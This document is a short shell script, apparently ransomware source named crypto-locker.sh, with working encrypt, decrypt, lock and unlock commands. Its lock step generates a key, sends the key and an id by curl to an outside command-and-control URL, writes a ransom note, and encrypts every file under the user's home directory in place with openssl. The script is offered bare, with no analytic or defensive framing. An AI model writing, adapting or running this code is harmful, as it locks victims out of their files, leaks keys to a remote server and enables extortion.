#!/bin/sh
export self=$0
export cmd=$1
export key=$2
export file=$3
# the root path to encrypt (default to the HOME DIR)
export root_path=$HOME
# the path to send the id and decryption key to
export c2server = "https://www.bitslip6.com/crypto-locker"

# decrypt command
if [ "$cmd" = "dec" ]; then
    /usr/bin/file "$file"|grep -sq openssl;
    # only decrypt encrypted files
    if [ "$?" -eq "0" ]; then 
        /usr/bin/openssl enc -d -aes-256-cbc -in "$file" -out "$file.dec" -k "$key";
        /bin/mv "$file.dec" "$file"
    fi
fi
# encrypt command
if [ "$cmd" = "enc" ] && [ $file != "ransom.txt" ] && [ $file != "crypto-locker.sh" ]; then
    /usr/bin/file "$file"|grep -sq openssl;
    
    # only encrypt un-encrypted files
    if [ "$?" -eq "1" ]; then 
        /usr/bin/openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$key";
        # echo "encrypting: $file [$$] [$BASHPID]"
        /bin/mv "$file.enc" "$file"
    fi
fi
# lock command
if [ "$cmd" = "lock" ]; then
    id=`openssl rand -base64 32`
    key=`openssl rand -base64 32`
    url="$c2server?id=$id&key=$key"
    /usr/bin/curl -s $url>$HOME/ransom.txt
    echo "PID $$ ENCRYPTING: $root_path with [$key]" >> $HOME/ransom.txt
    find $root_path -type f | xargs -P 4 -I % $self enc "$key" '%'
    cp $HOME/ransom.txt $HOME/Documents/ransom.txt
    open $HOME/ransom.txt
fi
# unlock 
if [ "$cmd" = "unlock" ]; then
    find $root_path -type f | xargs -P 4 -I % $self dec "$key" '%'
    echo "All Files Restored"
fi
